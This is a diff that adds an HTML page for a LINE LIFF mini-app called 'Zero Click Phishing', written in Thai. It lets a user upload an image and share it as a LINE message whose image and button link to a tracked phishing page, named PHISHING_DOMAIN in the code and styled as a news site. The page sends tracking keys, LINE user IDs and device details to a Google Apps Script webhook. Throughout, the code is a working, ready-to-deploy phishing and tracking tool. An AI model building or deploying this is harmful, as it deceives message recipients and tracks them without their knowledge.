@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zero Click Phishing - LIFF</title>
+    <link href="https://fonts.googleapis.com/css2?family=Prompt:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <!-- Line LIFF SDK -->
+    <script src="https://static.line-scdn.net/liff/edge/2/sdk.js"></script>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: 'Prompt', sans-serif;
+        }
+        body {
+            margin: 0;
+            padding: 16px;
+            background-color: #f5f5f5;
+            color: #333;
+        }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background-color: #fff;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+        .header {
+            background: linear-gradient(135deg, #00B900, #007700);
+            color: white;
+            padding: 20px;
+            text-align: center;
+            position: relative;
+        }
+        .header h1 {
+            margin: 0;
+            font-size: 20px;
+            font-weight: 500;
+        }
+        .header .subtitle {
+            font-size: 14px;
+            opacity: 0.9;
+            margin-top: 5px;
+        }
+        .content {
+            padding: 20px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #555;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        input[type="text"]:focus {
+            border-color: #00B900;
+            outline: none;
+        }
+        .image-preview-container {
+            margin-top: 10px;
+            text-align: center;
+            border: 2px dashed #ddd;
+            padding: 20px;
+            border-radius: 8px;
+            background-color: #fafafa;
+            transition: all 0.3s ease;
+        }
+        .image-preview-container:hover {
+            border-color: #00B900;
+            background-color: #f0f8f0;
+        }
+        .image-preview {
+            max-width: 100%;
+            max-height: 200px;
+            display: none;
+            margin-top: 10px;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+        .btn {
+            display: inline-block;
+            background-color: #00B900;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            text-align: center;
+            width: 100%;
+            font-weight: 500;
+        }
+        .btn:hover {
+            background-color: #009900;
+        }
+        .btn:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+        .btn-file {
+            background-color: #666;
+            margin-bottom: 15px;
+        }
+        .btn-file:hover {
+            background-color: #555;
+        }
+        .btn-share {
+            margin-top: 20px;
+        }
+        .status {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 6px;
+            text-align: center;
+            display: none;
+        }
+        .status.success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .status.error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        .input-group {
+            display: flex;
+            margin-bottom: 10px;
+        }
+        .input-group input {
+            flex: 1;
+            border-top-right-radius: 0;
+            border-bottom-right-radius: 0;
+        }
+        .input-group button {
+            border-top-left-radius: 0;
+            border-bottom-left-radius: 0;
+            padding: 0 15px;
+            background-color: #00B900;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        .input-group button:hover {
+            background-color: #009900;
+        }
+        .footer {
+            text-align: center;
+            padding: 15px;
+            font-size: 12px;
+            color: #888;
+            border-top: 1px solid #eee;
+        }
+        .loader {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+        }
+        .loader-spinner {
+            width: 40px;
+            height: 40px;
+            margin: 0 auto;
+            border: 4px solid rgba(0, 185, 0, 0.2);
+            border-top: 4px solid #00B900;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .tips {
+            background-color: #e9f7fe;
+            border-left: 4px solid #4fc3f7;
+            padding: 10px 15px;
+            margin: 20px 0;
+            font-size: 14px;
+            border-radius: 4px;
+        }
+        .tips p {
+            margin: 0;
+            color: #0277bd;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Zero Click Phishing</h1>
+            <div class="subtitle">แชร์รูปภาพพร้อมการติดตาม</div>
+        </div>
+        
+        <div class="content">
+            <div class="form-group">
+                <label for="caseName">ชื่อเคส</label>
+                <div class="input-group">
+                    <input type="text" id="caseName" placeholder="ระบุชื่อเคส" required>
+                    <button id="generateTrackingBtn" title="สร้าง Tracking Key อัตโนมัติ">⚡</button>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label for="imageUpload">เลือกรูปภาพ</label>
+                <button class="btn btn-file" id="selectImageBtn">เลือกรูปภาพ</button>
+                <input type="file" id="imageUpload" accept="image/*" style="display: none;">
+                <div class="image-preview-container">
+                    <img id="imagePreview" class="image-preview">
+                    <div id="uploadPrompt">คลิกเพื่อเลือกหรือลากรูปภาพมาที่นี่</div>
+                </div>
+            </div>
+            
+            <div class="loader">
+                <div class="loader-spinner"></div>
+                <p>กำลังอัพโหลดรูปภาพ...</p>
+            </div>
+            
+            <div id="statusMessage" class="status"></div>
+            
+            <button class="btn btn-share" id="shareBtn" disabled>แชร์รูปภาพ</button>
+            
+            <div class="tips">
+                <p><strong>คำแนะนำ:</strong> รูปภาพควรมีขนาดเหมาะสม เพื่อการโหลดที่รวดเร็ว</p>
+            </div>
+        </div>
+        
+        <div class="footer">
+            &copy; 2025 Zero Click Phishing System - LINE LIFF
+        </div>
+    </div>
+
+    <script>
+        // ตัวแปรสำหรับเก็บข้อมูล
+        let selectedImage = null;
+        let trackingKey = "";
+        let imageUrl = "";
+        let userId = "";
+        let displayName = "";
+        let isLiffInitialized = false;
+        
+        // ค่า Config
+        const WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbydls9VdR40-hUr_2uCGz7WXubw94sXLWVjUnd9Orh5vOAuarKfwSYvYI_ZpXKMvK13gg/exec';
+        const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/zero-click.html';
+        
+        // เริ่มต้นการทำงาน LIFF
+        document.addEventListener('DOMContentLoaded', function() {
+            initializeLiff();
+            setupEventListeners();
+        });
+        
+        // ฟังก์ชันเริ่มต้นการทำงาน LIFF
+        async function initializeLiff() {
+            try {
+                // ใส่ LIFF ID ของคุณตรงนี้
+                const liffId = 'YOUR_LIFF_ID';
+                await liff.init({ liffId: liffId });
+                
+                if (!liff.isLoggedIn()) {
+                    liff.login();
+                    return;
+                }
+                
+                // ดึงข้อมูลโปรไฟล์ผู้ใช้
+                const profile = await liff.getProfile();
+                userId = profile.userId;
+                displayName = profile.displayName;
+                
+                console.log(`ผู้ใช้: ${displayName} (${userId})`);
+                isLiffInitialized = true;
+                
+                // ตรวจสอบว่ามีพารามิเตอร์ caseName มาจาก URL หรือไม่
+                const urlParams = new URLSearchParams(window.location.search);
+                const caseNameParam = urlParams.get('case');
+                if (caseNameParam) {
+                    document.getElementById('caseName').value = caseNameParam;
+                }
+                
+            } catch (error) {
+                console.error('LIFF initialization failed', error);
+                showStatus('เกิดข้อผิดพลาดในการเริ่มต้น LIFF: ' + error.message, false);
+            }
+        }
+        
+        // ตั้งค่า Event Listeners
+        function setupEventListeners() {
+            // ปุ่มเลือกรูปภาพ
+            document.getElementById('selectImageBtn').addEventListener('click', function() {
+                document.getElementById('imageUpload').click();
+            });
+            
+            // การเลือกรูปภาพ
+            document.getElementById('imageUpload').addEventListener('change', handleImageSelect);
+            
+            // ปุ่มสร้าง Tracking Key
+            document.getElementById('generateTrackingBtn').addEventListener('click', generateTrackingKey);
+            
+            // ปุ่มแชร์รูปภาพ
+            document.getElementById('shareBtn').addEventListener('click', shareImage);
+            
+            // Drag and drop สำหรับรูปภาพ
+            const dropArea = document.querySelector('.image-preview-container');
+            
+            ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
+                dropArea.addEventListener(eventName, preventDefaults, false);
+            });
+            
+            function preventDefaults(e) {
+                e.preventDefault();
+                e.stopPropagation();
+            }
+            
+            ['dragenter', 'dragover'].forEach(eventName => {
+                dropArea.addEventListener(eventName, highlight, false);
+            });
+            
+            ['dragleave', 'drop'].forEach(eventName => {
+                dropArea.addEventListener(eventName, unhighlight, false);
+            });
+            
+            function highlight() {
+                dropArea.style.borderColor = '#00B900';
+                dropArea.style.backgroundColor = '#f0f8f0';
+            }
+            
+            function unhighlight() {
+                dropArea.style.borderColor = '#ddd';
+                dropArea.style.backgroundColor = '#fafafa';
+            }
+            
+            dropArea.addEventListener('drop', handleDrop, false);
+            
+            function handleDrop(e) {
+                const dt = e.dataTransfer;
+                const files = dt.files;
+                if (files.length) {
+                    document.getElementById('imageUpload').files = files;
+                    handleImageSelect({ target: { files: files } });
+                }
+            }
+            
+            // คลิกที่พื้นที่รูปภาพเพื่อเลือกรูปภาพ
+            dropArea.addEventListener('click', function() {
+                document.getElementById('imageUpload').click();
+            });
+        }
+        
+        // ฟังก์ชันจัดการรูปภาพที่เลือก
+        function handleImageSelect(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+            
+            // ตรวจสอบว่าเป็นรูปภาพหรือไม่
+            if (!file.type.match('image.*')) {
+                showStatus('กรุณาเลือกไฟล์รูปภาพเท่านั้น', false);
+                return;
+            }
+            
+            selectedImage = file;
+            
+            // แสดงตัวอย่างรูปภาพ
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                const img = document.getElementById('imagePreview');
+                img.src = e.target.result;
+                img.style.display = 'block';
+                document.getElementById('uploadPrompt').style.display = 'none';
+            };
+            reader.readAsDataURL(file);
+            
+            // ตรวจสอบว่าสามารถแชร์ได้หรือไม่
+            checkCanShare();
+        }
+        
+        // ฟังก์ชันอัพโหลดรูปภาพไปยัง Imgur หรือบริการอื่นๆ
+        async function uploadImage() {
+            if (!selectedImage) {
+                showStatus('กรุณาเลือกรูปภาพก่อน', false);
+                return null;
+            }
+            
+            // แสดง loader
+            document.querySelector('.loader').style.display = 'block';
+            
+            try {
+                // ใช้ ImgBB API สำหรับอัพโหลดรูปภาพ (ฟรี)
+                // คุณต้องสมัครและรับ API key จาก https://api.imgbb.com/
+                const IMGBB_API_KEY = 'YOUR_IMGBB_API_KEY';
+                
+                const formData = new FormData();
+                formData.append('image', selectedImage);
+                formData.append('key', IMGBB_API_KEY);
+                
+                const response = await fetch('https://api.imgbb.com/1/upload', {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    // ซ่อน loader
+                    document.querySelector('.loader').style.display = 'none';
+                    return data.data.url;
+                } else {
+                    throw new Error(data.error.message || 'การอัพโหลดล้มเหลว');
+                }
+            } catch (error) {
+                console.error('Error uploading image:', error);
+                showStatus('เกิดข้อผิดพลาดในการอัพโหลดรูปภาพ: ' + error.message, false);
+                // ซ่อน loader
+                document.querySelector('.loader').style.display = 'none';
+                return null;
+            }
+        }
+        
+        // ฟังก์ชันสร้าง Tracking Key
+        function generateTrackingKey() {
+            const caseName = document.getElementById('caseName').value;
+            if (!caseName) {
+                showStatus('กรุณาระบุชื่อเคส', false);
+                return;
+            }
+            
+            // สร้าง Tracking Key
+            const now = new Date();
+            const timestamp = now.getTime().toString(36);
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let randomPart = '';
+            for (let i = 0; i < 4; i++) {
+                randomPart += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            
+            trackingKey = timestamp + '-' + randomPart;
+            
+            // บันทึก Tracking Key และ Case Name
+            saveTrackingCaseMapping(trackingKey, caseName);
+            
+            showStatus(`Tracking Key สร้างสำเร็จ: ${trackingKey}`, true);
+            
+            // ตรวจสอบว่าสามารถแชร์ได้หรือไม่
+            checkCanShare();
+        }
+        
+        // ฟังก์ชันบันทึก Tracking Key และ Case Name
+        async function saveTrackingCaseMapping(trackKey, caseName) {
+            if (!isLiffInitialized || !userId) {
+                showStatus('กรุณารอให้ LIFF เริ่มต้นก่อน', false);
+                return false;
+            }
+            
+            try {
+                // ส่งข้อมูลไปยัง Google Script Webhook
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        action: 'saveTrackingMapping',
+                        trackingKey: trackKey,
+                        caseName: caseName,
+                        creatorId: userId,
+                        creatorName: displayName,
+                        requestId: generateUniqueId()
+                    })
+                });
+                
+                if (response.ok) {
+                    console.log('บันทึก Tracking Key สำเร็จ');
+                    return true;
+                } else {
+                    console.error('บันทึก Tracking Key ล้มเหลว', await response.text());
+                    return false;
+                }
+            } catch (error) {
+                console.error('เกิดข้อผิดพลาดในการบันทึก Tracking Key', error);
+                return false;
+            }
+        }
+        
+        // ฟังก์ชันตรวจสอบว่าสามารถแชร์ได้หรือไม่
+        function checkCanShare() {
+            const caseName = document.getElementById('caseName').value;
+            const shareBtn = document.getElementById('shareBtn');
+            
+            if (selectedImage && caseName) {
+                shareBtn.disabled = false;
+            } else {
+                shareBtn.disabled = true;
+            }
+        }
+        
+        // ฟังก์ชันแชร์รูปภาพ
+        async function shareImage() {
+            if (!isLiffInitialized) {
+                showStatus('กรุณารอให้ LIFF เริ่มต้นก่อน', false);
+                return;
+            }
+            
+            const caseName = document.getElementById('caseName').value;
+            if (!caseName) {
+                showStatus('กรุณาระบุชื่อเคส', false);
+                return;
+            }
+            
+            if (!selectedImage) {
+                showStatus('กรุณาเลือกรูปภาพ', false);
+                return;
+            }
+            
+            if (!trackingKey) {
+                // สร้าง Tracking Key หากยังไม่มี
+                generateTrackingKey();
+            }
+            
+            try {
+                // อัพโหลดรูปภาพ
+                imageUrl = await uploadImage();
+                if (!imageUrl) return;
+                
+                // สร้าง URL สำหรับ Zero Click
+                const zeroClickUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`;
+                
+                // สร้างข้อความแชร์
+                const message = {
+                    type: 'flex',
+                    altText: `รูปภาพจากผู้ใช้ ${displayName}`,
+                    contents: {
+                        type: 'bubble',
+                        hero: {
+                            type: 'image',
+                            url: imageUrl,
+                            size: 'full',
+                            aspectRatio: '16:9',
+                            aspectMode: 'cover',
+                            action: {
+                                type: 'uri',
+                                uri: zeroClickUrl
+                            }
+                        },
+                        body: {
+                            type: 'box',
+                            layout: 'vertical',
+                            contents: [
+                                {
+                                    type: 'text',
+                                    text: 'รูปภาพใหม่',
+                                    weight: 'bold',
+                                    size: 'xl'
+                                },
+                                {
+                                    type: 'text',
+                                    text: 'กดที่รูปภาพเพื่อดูเพิ่มเติม',
+                                    size: 'sm',
+                                    color: '#888888',
+                                    margin: 'md'
+                                }
+                            ]
+                        },
+                        footer: {
+                            type: 'box',
+                            layout: 'vertical',
+                            contents: [
+                                {
+                                    type: 'button',
+                                    style: 'primary',
+                                    action: {
+                                        type: 'uri',
+                                        label: 'ดูรูปภาพเพิ่มเติม',
+                                        uri: zeroClickUrl
+                                    }
+                                }
+                            ]
+                        }
+                    }
+                };
+                
+                // ส่งข้อมูลการเปิดดูแรก (Zero Click)
+                sendZeroClickNotification(trackingKey, caseName);
+                
+                if (liff.isApiAvailable('shareTargetPicker')) {
+                    const result = await liff.shareTargetPicker([message]);
+                    
+                    if (result) {
+                        showStatus('แชร์รูปภาพสำเร็จ', true);
+                        // รีเซ็ตหน้าจอ
+                        resetForm();
+                    } else {
+                        showStatus('การแชร์ถูกยกเลิก', false);
+                    }
+                } else {
+                    showStatus('ShareTargetPicker ไม่พร้อมใช้งาน', false);
+                }
+                
+            } catch (error) {
+                console.error('Error sharing image', error);
+                showStatus('เกิดข้อผิดพลาดในการแชร์รูปภาพ: ' + error.message, false);
+            }
+        }
+        
+        // ฟังก์ชันส่งการแจ้งเตือน Zero Click
+        async function sendZeroClickNotification(trackingKey, caseName) {
+            try {
+                // ข้อมูลอุปกรณ์และข้อมูลพื้นฐานเพื่อส่งไปยังเซิร์ฟเวอร์
+                const dataToSend = {
+                    trackingKey: trackingKey,
+                    caseName: caseName,
+                    message: "[Zero Click] มีผู้เปิดดูข้อความ",
+                    timestamp: new Date().toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' }),
+                    ip: { ip: "กำลังตรวจสอบ" },
+                    deviceInfo: {
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        language: navigator.language
+                    },
+                    requestId: generateUniqueId(),
+                    type: "zero-click-first-view"
+                };
+                
+                // ส่งข้อมูลไปยัง Webhook
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(dataToSend)
+                });
+                
+                console.log('ส่งการแจ้งเตือน Zero Click สำเร็จ');
+                
+            } catch (error) {
+                console.error('Error sending Zero Click notification', error);
+            }
+        }
+        
+        // ฟังก์ชันแสดงสถานะ
+        function showStatus(message, isSuccess) {
+            const statusEl = document.getElementById('statusMessage');
+            statusEl.textContent = message;
+            statusEl.style.display = 'block';
+            
+            if (isSuccess) {
+                statusEl.className = 'status success';
+            } else {
+                statusEl.className = 'status error';
+            }
+            
+            // ซ่อนสถานะหลังจาก 5 วินาที
+            setTimeout(() => {
+                statusEl.style.display = 'none';
+            }, 5000);
+        }
+        
+        // ฟังก์ชันรีเซ็ตแบบฟอร์ม
+        function resetForm() {
+            document.getElementById('caseName').value = '';
+            document.getElementById('imageUpload').value = '';
+            document.getElementById('imagePreview').style.display = 'none';
+            document.getElementById('uploadPrompt').style.display = 'block';
+            document.getElementById('shareBtn').disabled = true;
+            
+            selectedImage = null;
+            trackingKey = "";
+            imageUrl = "";
+        }
+        
+        // ฟังก์ชันสร้าง ID เฉพาะ
+        function generateUniqueId() {
+            return Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
+        }
+    </script>
+</body>
+</html>
